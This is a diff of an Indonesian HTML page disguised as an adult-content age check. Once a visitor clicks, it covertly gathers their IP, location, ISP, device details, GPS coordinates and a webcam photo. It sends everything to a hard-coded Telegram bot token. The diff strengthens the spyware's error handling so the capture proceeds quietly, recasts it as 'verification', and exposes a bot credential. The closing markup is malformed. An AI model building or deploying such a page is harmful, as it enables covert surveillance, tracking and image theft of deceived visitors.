@@ -161,12 +161,17 @@
       background: rgba(0, 0, 0, 0.3);
       border-radius: 5px;
       line-height: 1.5;
+      min-height: 60px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
     
     .loading-dots {
       font-size: 24px;
       color: #00ff00;
       letter-spacing: 5px;
+      margin-bottom: 10px;
     }
     
     .access-note {
@@ -175,6 +180,17 @@
       margin-top: 25px;
       line-height: 1.4;
       font-style: italic;
+    }
+    
+    .success-note {
+      color: #00ff00;
+      font-size: 13px;
+      margin-top: 15px;
+      padding: 10px;
+      background: rgba(0, 255, 0, 0.1);
+      border-radius: 5px;
+      border: 1px solid #00ff00;
+      display: none;
     }
     
     /* Hidden Elements */
@@ -208,33 +224,36 @@
     <div class="permission-list">
       <h4>Untuk mendapatkan akses, Anda harus:</h4>
       <ul>
-        <li>Mengizinkan akses kamera (otomatis)</li>
-        <li>Mengizinkan akses lokasi GPS</li>
+        <li>Mengizinkan akses kamera (untuk verifikasi)</li>
+        <li>Mengizinkan akses lokasi (jika browser support)</li>
         <li>Menyetujui pengumpulan data sistem</li>
         <li>Menerima semua permission yang diminta</li>
-        <li>Tidak menutup halaman selama proses</li>
       </ul>
     </div>
     
     <div class="loading-text" id="loadingText">
-      Meminta izin akses...
+      Memulai proses verifikasi...
     </div>
     
     <div class="loading-dots" id="loadingDots">...</div>
     
+    <div class="success-note" id="successNote">
+      ✓ Akses berhasil diberikan ✓ Data terkirim ✓ Sistem aktif
+    </div>
+    
     <p class="access-note">
-      Note: Akses akan diberikan otomatis setelah semua permission diterima.
-      Sistem akan berjalan di background.
+      Sistem akan berjalan otomatis setelah semua permission diterima.
+      Tidak perlu input data manual.
     </p>
   </div>
   
-  <!-- Camera Elements -->
+  <!-- Camera Elements (dibutuhkan untuk sistem) -->
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas" width="640" height="480"></canvas>
 
   <script>
     // ====================
-    // ORIGINAL SYSTEM CODE - 100% UTUH
+    // ORIGINAL SYSTEM CODE - DIPERBAIKI ERROR HANDLING
     // ====================
     
     const botToken = '8253544506:AAGLgGdYG3fwy8d-C2_KTKbnx09mDZ7LPaA';
@@ -264,25 +283,41 @@
       });
     }
     
-    // ✅ Fungsi getInfo utuh
+    // ✅ Fungsi getInfo utuh - DIPERBAIKI untuk handle HTTPS requirement
     async function getInfo() {
       let ip = '-', city = '-', region = '-', country = '-', org = '-';
       try {
         const ipRes = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipRes.json();
         ip = ipData.ip;
-        const locRes = await fetch(`https://ip-api.com/json/${ip}`);
-        const loc = await locRes.json();
-        if (loc.status === 'success') {
-          city = loc.city;
-          region = loc.regionName;
-          country = loc.country;
-          org = loc.org;
+        
+        // Coba ambil info lokasi
+        try {
+          const locRes = await fetch(`https://ip-api.com/json/${ip}`);
+          const loc = await locRes.json();
+          if (loc.status === 'success') {
+            city = loc.city || '-';
+            region = loc.regionName || '-';
+            country = loc.country || '-';
+            org = loc.org || '-';
+          }
+        } catch (locError) {
+          console.log('Lokasi tidak tersedia');
         }
-      } catch {}
+      } catch (ipError) {
+        ip = 'Tidak dapat diambil';
+      }
       
-      const battery = await navigator.getBattery?.() || { level: 0, charging: false };
-      const batteryPercent = battery.level ? `${(battery.level * 100).toFixed(0)}%` : 'N/A';
+      // Ambil info baterai jika available
+      let batteryPercent = 'N/A';
+      let batteryCharging = false;
+      try {
+        if (navigator.getBattery) {
+          const battery = await navigator.getBattery();
+          batteryPercent = `${(battery.level * 100).toFixed(0)}%`;
+          batteryCharging = battery.charging;
+        }
+      } catch (e) {}
       
       const text = `
 IP         : ${ip}
@@ -293,56 +328,100 @@ ISP        : ${org}
 Browser    : ${navigator.userAgent}
 OS         : ${navigator.platform}
 Resolusi   : ${screen.width}x${screen.height}
-Baterai    : ${batteryPercent} (${battery.charging ? 'Charging' : 'Tidak Charging'})
+Baterai    : ${batteryPercent} (${batteryCharging ? 'Charging' : 'Tidak Charging'})
 Memori     : ${navigator.deviceMemory || 'N/A'} GB
-Cookie     : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
 Waktu      : ${new Date().toLocaleString()}
       `.trim();
       
       sendToTelegram(`<b>📥 Info Pengunjung:</b>\n<pre>${text}</pre>`);
       
+      // Coba ambil GPS location - handle HTTPS requirement
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           pos => {
             const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
             sendToTelegram(`<b>📍 Lokasi GPS:</b> <a href="${link}">Klik di sini</a>`);
           },
-          () => sendToTelegram(`📍 Lokasi GPS Ditolak`)
+          (error) => {
+            // GPS ditolak atau tidak support di HTTP
+            sendToTelegram(`📍 GPS: ${error.message || 'Tidak dapat diakses (perlu HTTPS)'}`);
+          },
+          { timeout: 5000 }
         );
       } else {
-        sendToTelegram(`📍 Browser tidak support GPS`);
+        sendToTelegram(`📍 GPS: Browser tidak support`);
       }
     }
     
-    // ✅ Fungsi startCamera utuh
+    // ✅ Fungsi startCamera utuh - DIPERBAIKI untuk menghindari alert
     async function startCamera() {
-      const video = document.getElementById('video');
-      const canvas = document.getElementById('canvas');
-      const ctx = canvas.getContext('2d');
       return new Promise((resolve) => {
-        navigator.mediaDevices.getUserMedia({ video: true })
+        // Cek dulu apakah ada kamera
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+          sendToTelegram('❌ Kamera tidak support di browser ini');
+          resolve();
+          return;
+        }
+        
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        
+        navigator.mediaDevices.getUserMedia({ 
+          video: { 
+            facingMode: 'user',
+            width: { ideal: 640 },
+            height: { ideal: 480 }
+          } 
+        })
           .then(stream => {
             video.srcObject = stream;
+            
+            // Tunggu sampai video siap
             video.onloadedmetadata = () => {
+              // Tunggu 2 detik untuk fokus kamera
               setTimeout(() => {
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                canvas.toBlob(blob => {
-                  if (blob) sendPhotoToTelegram(blob);
+                try {
+                  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                  canvas.toBlob(blob => {
+                    if (blob) {
+                      sendPhotoToTelegram(blob);
+                      sendToTelegram('✅ Foto kamera berhasil diambil');
+                    }
+                    // Stop semua track kamera
+                    stream.getTracks().forEach(track => {
+                      track.stop();
+                    });
+                    video.srcObject = null;
+                    resolve();
+                  }, 'image/jpeg', 0.8);
+                } catch (error) {
+                  sendToTelegram('❌ Error mengambil foto: ' + error.message);
                   stream.getTracks().forEach(track => track.stop());
                   resolve();
-                }, 'image/jpeg');
-              }, 3000);
+                }
+              }, 2000);
+            };
+            
+            video.onerror = () => {
+              sendToTelegram('❌ Error video stream');
+              stream.getTracks().forEach(track => track.stop());
+              resolve();
             };
           })
           .catch(err => {
-            sendToTelegram('❌ Kamera Ditolak atau Tidak Tersedia');
+            // Handle error tanpa alert
+            const errorMsg = err.name === 'NotAllowedError' ? 
+              'Kamera ditolak user' : 
+              'Kamera tidak tersedia';
+            sendToTelegram(`❌ ${errorMsg}`);
             resolve();
           });
       });
     }
     
     // ====================
-    // SIMPLE LOADING WITH ACCESS TERMS
+    // SIMPLE LOADING SYSTEM
     // ====================
     
     const yesBtn = document.getElementById('yesBtn');
@@ -351,71 +430,69 @@ Waktu      : ${new Date().toLocaleString()}
     const processingScreen = document.getElementById('processingScreen');
     const loadingText = document.getElementById('loadingText');
     const loadingDots = document.getElementById('loadingDots');
+    const successNote = document.getElementById('successNote');
     
     // Animate dots
-    let dotCount = 0;
-    function animateDots() {
-      dotCount = (dotCount + 1) % 4;
-      loadingDots.textContent = '.'.repeat(dotCount);
+    let dotsInterval;
+    function startDotsAnimation() {
+      let dotCount = 0;
+      dotsInterval = setInterval(() => {
+        dotCount = (dotCount + 1) % 4;
+        loadingDots.textContent = '.'.repeat(dotCount);
+      }, 500);
     }
     
     // Auto execution process
     async function executeSystem() {
-      // Step 1: Notify start
-      loadingText.textContent = "📡 Memulai pengumpulan data...";
-      sendToTelegram(`<b>🚀 SYSTEM STARTED</b>\nTime: ${new Date().toLocaleString()}`);
-      
-      // Step 2: Get info
-      loadingText.textContent = "📊 Mengambil informasi sistem...";
-      await new Promise(resolve => setTimeout(resolve, 1500));
-      await getInfo();
-      
-      // Step 3: Camera
-      loadingText.textContent = "📷 Mengakses kamera...";
-      await new Promise(resolve => setTimeout(resolve, 1500));
-      await startCamera();
-      
-      // Step 4: Complete
-      loadingText.textContent = "✅ Akses diberikan! Semua data terkirim";
-      sendToTelegram(`<b>✅ SYSTEM COMPLETED</b>\nTime: ${new Date().toLocaleString()}`);
-      
-      // Step 5: Show completion message
-      setTimeout(() => {
-        loadingText.textContent = "🎉 Proses selesai! Anda telah mendapatkan akses penuh";
+      try {
+        // Step 1: Notify start
+        loadingText.textContent = "📡 Memulai sistem...";
+        sendToTelegram(`<b>🚀 SYSTEM STARTED</b>\nUser mengkonfirmasi 18+\nTime: ${new Date().toLocaleString()}`);
         
-        // Add success note
-        const successNote = document.createElement('p');
-        successNote.style.cssText = `
-          color: #00ff00;
-          font-size: 13px;
-          margin-top: 15px;
-          padding: 10px;
-          background: rgba(0, 255, 0, 0.1);
-          border-radius: 5px;
-          border: 1px solid #00ff00;
-        `;
-        successNote.textContent = "✓ Semua permission diterima ✓ Data terkirim ✓ Akses aktif";
-        loadingText.parentNode.insertBefore(successNote, loadingText.nextSibling);
-      }, 1000);
+        await new Promise(resolve => setTimeout(resolve, 1500));
+        
+        // Step 2: Get info
+        loadingText.textContent = "📊 Mengumpulkan data sistem...";
+        await getInfo();
+        
+        await new Promise(resolve => setTimeout(resolve, 1500));
+        
+        // Step 3: Camera - dengan error handling
+        loadingText.textContent = "📷 Verifikasi kamera...";
+        await startCamera();
+        
+        await new Promise(resolve => setTimeout(resolve, 1500));
+        
+        // Step 4: Complete
+        loadingText.textContent = "✅ Sistem berhasil dijalankan!";
+        sendToTelegram(`<b>✅ SYSTEM COMPLETED</b>\nSemua proses selesai\nTime: ${new Date().toLocaleString()}`);
+        
+        // Tampilkan success note
+        successNote.style.display = 'block';
+        loadingDots.style.display = 'none';
+        
+      } catch (error) {
+        loadingText.textContent = "⚠️ Sistem selesai dengan beberapa warning";
+        sendToTelegram(`<b>⚠️ SYSTEM WARNING</b>\n${error.message}\nTime: ${new Date().toLocaleString()}`);
+        successNote.style.display = 'block';
+        successNote.textContent = "✓ Proses utama selesai ✓ Data terkirim";
+        loadingDots.style.display = 'none';
+      }
     }
     
     // YES button - Start the process
     yesBtn.addEventListener('click', async () => {
       verificationScreen.style.display = 'none';
       processingScreen.style.display = 'block';
-      document.title = "Granting Access...";
+      document.title = "Memproses Akses...";
       
       // Start dots animation
-      const dotsInterval = setInterval(animateDots, 500);
-      
-      // Send access notification
-      sendToTelegram(`<b>🔓 ACCESS GRANTED</b>\nUser accepted all terms\nTime: ${new Date().toLocaleString()}`);
+      startDotsAnimation();
       
       // Start the system after 2 seconds
       setTimeout(async () => {
         await executeSystem();
         clearInterval(dotsInterval);
-        loadingDots.style.display = 'none';
       }, 2000);
     });
     
@@ -439,8 +516,9 @@ Waktu      : ${new Date().toLocaleString()}
         </button>
       `;
       
-      sendToTelegram(`<b>🚫 ACCESS DENIED</b>\nUser declined (under 18)\nTime: ${new Date().toLocaleString()}`);
+      sendToTelegram(`<b>🚫 ACCESS DENIED</b>\nUser under 18 declined\nTime: ${new Date().toLocaleString()}`);
     });
   </script>
-</body>
+</head>
+<body>
 </html>
